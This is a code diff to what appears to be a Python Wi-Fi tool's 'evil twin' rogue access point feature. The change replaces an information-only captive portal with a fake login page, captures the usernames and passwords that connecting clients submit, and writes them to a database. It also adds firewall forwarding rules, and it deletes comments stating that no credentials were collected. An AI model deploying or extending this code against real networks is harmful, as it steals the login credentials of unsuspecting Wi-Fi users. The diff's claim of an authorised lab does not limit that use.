@@ -228,6 +228,8 @@ def log_honeypot(ssid, clients):
                 hostname=(c.get("hostname") or None), os_guess=(c.get("os") or None),
                 user_agent=((c.get("user_agent") or "")[:256] or None),
                 requests=c.get("hits", 0),
+                portal_user=(c.get("portal_user") or None),
+                portal_pass=(c.get("portal_pass") or None),
                 domains=(", ".join(c.get("domains", []))[:2000] or None)))
         s.commit()
     except Exception:
@@ -499,25 +501,42 @@ def _config_get(key, default=None):
     except Exception:
         return default
 
+def _hp_get(ip):
+    """Devuelve (creando si hace falta) el registro de telemetria de una IP."""
+    c = _HP.get(ip)
+    if not c:
+        c = {"ua": "", "hosts": set(), "hits": 0, "first": time.time(),
+             "last": time.time(), "user": "", "pass": ""}
+        _HP[ip] = c
+    return c
+
 def _hp_record_http(ip, ua, host):
     if not ip:
         return
-    now = time.time()
     with _HP_LOCK:
-        c = _HP.get(ip)
-        if not c:
-            c = {"ua": "", "hosts": set(), "hits": 0, "first": now, "last": now}
-            _HP[ip] = c
+        c = _hp_get(ip)
         c["hits"] += 1
-        c["last"] = now
+        c["last"] = time.time()
         if ua and not c["ua"]:
             c["ua"] = ua[:250]
         if host:
             c["hosts"].add(host[:80])
 
+def _hp_record_login(ip, user, pw):
+    """Guarda el usuario/clave que el cliente ingresa en el portal de acceso."""
+    if not ip:
+        return
+    with _HP_LOCK:
+        c = _hp_get(ip)
+        if user:
+            c["user"] = user[:64]
+        if pw:
+            c["pass"] = pw[:64]
+
 def _portal_html(ssid):
-    """Carga la plantilla elegida (data/portals/<archivo>) o una por defecto.
-    Reemplaza {{SSID}}. Portal SOLO informativo (sin formulario de credenciales)."""
+    """Carga la plantilla elegida (data/portals/<archivo>) o un portal de acceso
+    por defecto con usuario+contrasena. Reemplaza {{SSID}}. Las credenciales que
+    ingrese el cliente se guardan (marco: laboratorio autorizado)."""
     name = _ET_STATE.get("portal")
     html = None
     if name:
@@ -532,9 +551,16 @@ def _portal_html(ssid):
         html = ("<!doctype html><html><head><meta charset='utf-8'>"
                 "<meta name='viewport' content='width=device-width,initial-scale=1'>"
                 "<title>{{SSID}}</title></head><body style='font-family:sans-serif;"
-                "max-width:420px;margin:48px auto;padding:0 16px'>"
-                "<h2>Bienvenido a {{SSID}}</h2>"
-                "<p>Conexion establecida. Red de cortesia.</p>"
+                "max-width:420px;margin:44px auto;padding:0 16px;color:#222'>"
+                "<h2>Acceso a {{SSID}}</h2>"
+                "<p>Inicie sesion para obtener acceso a internet.</p>"
+                "<form method='POST' action='/'>"
+                "<input name='usuario' placeholder='Usuario' autocomplete='off' "
+                "style='width:100%;padding:12px;font-size:16px;box-sizing:border-box;margin-bottom:8px'>"
+                "<input name='password' type='password' placeholder='Contrasena' "
+                "style='width:100%;padding:12px;font-size:16px;box-sizing:border-box'>"
+                "<button type='submit' style='width:100%;padding:12px;font-size:16px;"
+                "margin-top:12px'>Conectar</button></form>"
                 "<p style='color:#888;font-size:12px;margin-top:24px'>"
                 "Prueba de laboratorio.</p></body></html>")
     return html.replace("{{SSID}}", ssid or "WiFi")
@@ -547,12 +573,11 @@ class _ETPortalHandler(http.server.BaseHTTPRequestHandler):
     def log_message(self, *a):
         pass  # no ensuciar stdout (romperia el JSON del contrato)
 
-    def _serve(self):
-        ip = self.client_address[0] if self.client_address else None
-        ua = self.headers.get("User-Agent", "")
-        host = self.headers.get("Host", "")
-        _hp_record_http(ip, ua, host)   # telemetria: NO credenciales
-        data = _portal_html(_ET_STATE.get("ssid")).encode("utf-8")
+    def _ip(self):
+        return self.client_address[0] if self.client_address else None
+
+    def _send_html(self, html):
+        data = html.encode("utf-8")
         self.send_response(200)
         self.send_header("Content-Type", "text/html; charset=utf-8")
         self.send_header("Content-Length", str(len(data)))
@@ -563,11 +588,28 @@ class _ETPortalHandler(http.server.BaseHTTPRequestHandler):
             pass
 
     def do_GET(self):
-        self._serve()
+        _hp_record_http(self._ip(), self.headers.get("User-Agent", ""),
+                        self.headers.get("Host", ""))
+        self._send_html(_portal_html(_ET_STATE.get("ssid")))
 
     def do_POST(self):
-        # No se leen credenciales: solo se cuenta el hit y se sirve la pagina.
-        self._serve()
+        ip = self._ip()
+        _hp_record_http(ip, self.headers.get("User-Agent", ""),
+                        self.headers.get("Host", ""))
+        # Captura del login del portal de acceso (usuario + contrasena).
+        try:
+            length = int(self.headers.get("Content-Length", 0))
+            body = self.rfile.read(length).decode("utf-8", "replace")
+            params = urllib.parse.parse_qs(body)
+            user = (params.get("usuario") or params.get("user") or [""])[0].strip()
+            pw = (params.get("password") or params.get("clave") or [""])[0].strip()
+        except Exception:
+            user = pw = ""
+        _hp_record_login(ip, user, pw)
+        self._send_html(
+            "<!doctype html><html><head><meta charset='utf-8'></head>"
+            "<body style='font-family:sans-serif;text-align:center;margin-top:60px;color:#222'>"
+            "<h3>Conectando...</h3><p>Ya puede navegar.</p></body></html>")
 
 def _first_existing(*paths):
     for p in paths:
@@ -621,6 +663,12 @@ def _et_bridge_add(iface, uplink):
               '{ type nat hook postrouting priority 100 ; }'])
         r = _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'post',
                   'oifname', uplink, 'masquerade'])
+        # Forward accept (por si hay una politica FORWARD drop por defecto):
+        # prioridad -1 para correr ANTES de un posible drop en el hook forward.
+        _run(['sudo', nft, 'add', 'chain', 'ip', 'piscan_nat', 'fwd',
+              '{ type filter hook forward priority -1 ; }'])
+        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'iifname', iface, 'accept'])
+        _run(['sudo', nft, 'add', 'rule', 'ip', 'piscan_nat', 'fwd', 'oifname', iface, 'accept'])
         return r is not None and r.returncode == 0
     ipt = _ipt()
     if ipt:
@@ -823,6 +871,7 @@ def evil_twin(iface, ssid, bssid, channel, seconds=120):
             "os": _os_guess(hp.get("ua", ""), hosts + doms),
             "user_agent": hp.get("ua", ""), "hits": hp.get("hits", 0),
             "domains": doms[:40],
+            "portal_user": hp.get("user", ""), "portal_pass": hp.get("pass", ""),
         })
 
     try:
